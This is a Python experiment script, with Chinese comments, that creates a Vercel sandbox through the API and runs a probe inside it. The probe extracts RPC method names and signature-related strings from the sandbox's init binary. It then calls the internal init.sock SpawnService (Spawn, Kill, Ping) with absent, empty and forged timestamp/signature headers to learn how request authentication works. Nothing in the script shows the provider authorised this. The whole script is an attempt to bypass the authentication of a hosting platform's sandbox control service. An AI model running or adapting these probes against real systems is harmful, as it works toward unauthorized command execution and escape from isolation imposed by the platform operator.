# 实验J51: Connect 正确 Content-Type 调用 + 方法名完整提取 + 签名探测
# 目标: 用 application/connect+json 调 init.sock, 弄清签名验证逻辑
import json, time, urllib.request, urllib.error, sys
try:
    sys.stdout.reconfigure(encoding='utf-8', errors='replace')
except Exception:
    pass

TOKEN = "vcp_REDACTED_PLACEHOLDER"
TEAM = "team_GIy1SZ444lspqeNbh4r8uAUg"
PROJ = "prj_iyw2xfjP3RKPT7n8b8c1tBIxxK5F"

def api(method, path, body=None, timeout=300):
    req = urllib.request.Request(f"https://api.vercel.com{path}", method=method)
    req.add_header("Authorization", f"Bearer {TOKEN}")
    req.add_header("Content-Type", "application/json")
    data = json.dumps(body).encode() if body is not None else None
    try:
        with urllib.request.urlopen(req, data=data, timeout=timeout) as r:
            return r.status, r.read().decode()
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode()[:600]
    except Exception as e:
        return -1, f"EXC {type(e).__name__}: {e}"

def run_cmd(sid, code, label, wait=True, timeout=300):
    body = {"command": "python3", "args": ["-c", code],
            "wait": wait, "logs": True, "timeout": timeout}
    c, r = api("POST", f"/v2/sandboxes/sessions/{sid}/cmd?teamId={TEAM}", body)
    print(f"=== cmd[{label}] status {c} ===", flush=True)
    if c != 200:
        print(f"  RAW: {r[:400]}", flush=True)
        return
    for line in r.splitlines():
        line = line.strip()
        if not line:
            continue
        try:
            d = json.loads(line)
            if d.get("stream") in ("stdout", "stderr"):
                print(d.get("data", ""), end="", flush=True)
            elif d.get("stream") == "command":
                print("\nEXIT:", d.get("command", {}).get("exitCode"), flush=True)
        except Exception:
            print(line[:400], flush=True)

NAME = "expj51"
api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
c, r = api("POST", f"/v2/sandboxes?teamId={TEAM}",
           {"projectId": PROJ, "name": NAME,
            "networkPolicy": {"mode": "custom", "allowedDomains": ["httpbin.org"]}})
print("create:", c)
sid = json.loads(r)["sandbox"]["currentSessionId"]
print("sid:", sid)

SCAN = r'''
import re, subprocess, json, time, hashlib, hmac, os, base64

print("===== [1] 方法名完整提取 =====", flush=True)
b = open("/run/vercel/share/sandbox-init", "rb").read()
meths = set()
for m in re.finditer(rb"/vercel\.sandbox\.spawn\.v1\.SpawnService/([A-Za-z0-9_]+)", b):
    meths.add(m.group(1).decode('latin1'))
print("methods:", sorted(meths), flush=True)
# 事件名
evs = set()
for m in re.finditer(rb"vercel\.sandbox\.spawn\.v1\.(Spawn[A-Za-z]+|ExitStatus[A-Za-z]*|Pty[A-Za-z]+)", b):
    evs.add(m.group(1).decode('latin1'))
print("events:", sorted(evs), flush=True)
# signature 相关字符串上下文
print("--- signature ctx ---", flush=True)
for m in re.finditer(rb"missing [a-z ]*header", b):
    print("  %r" % m.group(0), flush=True)
for m in re.finditer(rb"[A-Za-z0-9_./:-]{0,40}(signature|timestamp)[A-Za-z0-9_ ./:-]{0,60}", b):
    s = m.group(0)
    if len(s) > 12:
        print("  SIG: %r" % s, flush=True)
# pubkey 附近
i = b.find(b"--pubkey")
if i >= 0:
    print("pubkey ctx: %r" % b[max(0,i-100):i+200], flush=True)
# SpawnRequest 字段 (descriptor 里)
i = b.find(b"SpawnRequest")
while i >= 0 and i < len(b):
    chunk = b[i:i+400]
    if b"command" in chunk and b"arguments" in chunk:
        print("SpawnRequest ctx: %r" % chunk, flush=True)
        break
    i = b.find(b"SpawnRequest", i+1)

print("===== [2] Connect+JSON 调用 =====", flush=True)
def ccall(path, body, headers=None, ctype="application/connect+json", unix="/run/vercel/share/init.sock", timeout=8):
    cmd = ["curl", "-sS", "--max-time", str(timeout), "-i", "-X", "POST",
           "--unix-socket", unix,
           "-H", "Content-Type: " + ctype,
           "-H", "Connect-Protocol-Version: 1"]
    for k, v in (headers or {}).items():
        cmd += ["-H", "%s: %s" % (k, v)]
    cmd += ["-d", json.dumps(body), "http://localhost" + path]
    try:
        r = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout+2)
        return r.stdout[:1200], r.stderr[:300]
    except Exception as e:
        return "EXC " + str(e), ""

ts = str(int(time.time() * 1000))
tests = [
    ("no-auth", {}),
    ("ts-only", {"timestamp": ts}),
    ("ts-fake-sig", {"timestamp": ts, "signature": "AAAA" + "0"*60}),
    ("ts-sig-ed25519", {"timestamp": ts, "signature": base64.b64encode(b"\x01"*64).decode()}),
    ("x-vercel-ts", {"x-vercel-timestamp": ts, "x-vercel-signature": base64.b64encode(b"\x01"*64).decode()}),
    ("x-ts", {"x-timestamp": ts, "x-signature": base64.b64encode(b"\x01"*64).decode()}),
    ("sig-empty", {"timestamp": "", "signature": ""}),
]
paths = [
    "/vercel.sandbox.spawn.v1.SpawnService/Ping",
    "/vercel.sandbox.spawn.v1.SpawnService/Spawn",
    "/vercel.sandbox.spawn.v1.SpawnService/Kill",
]
for path in paths:
    for label, hdrs in tests:
        out, err = ccall(path, {}, hdrs)
        first = out.split("\r\n\r\n")[0] if "\r\n\r\n" in out else out
        print("PATH %s [%s]: %s" % (path, label, first.replace("\r\n", " | ")[:600]), flush=True)
        if "error" in out.lower() and "404" not in out:
            print("   BODY: %r" % out[out.find("\r\n\r\n")+4:][:400], flush=True)
        if "401" in out or "403" in out or "200" in out:
            print("   FULL: %r" % out[:1000], flush=True)

print("===== [3] Ping 各种 body =====", flush=True)
for body in [{}, {"command": "id"}, {"name": "x"}, {"request": {}}]:
    out, err = ccall("/vercel.sandbox.spawn.v1.SpawnService/Ping", body)
    print("PING body %r -> %r %r" % (body, out[:500], err), flush=True)

print("===== [4] gRPC 尝试 =====", flush=True)
out, err = ccall("/vercel.sandbox.spawn.v1.SpawnService/Ping", {}, ctype="application/grpc+json")
print("grpc+json:", out[:500], flush=True)
'''
run_cmd(sid, SCAN, "connect-json-sig-probe", wait=True, timeout=300000)

api("DELETE", f"/v2/sandboxes/{NAME}?teamId={TEAM}&projectId={PROJ}")
print("\ncleanup done", flush=True)
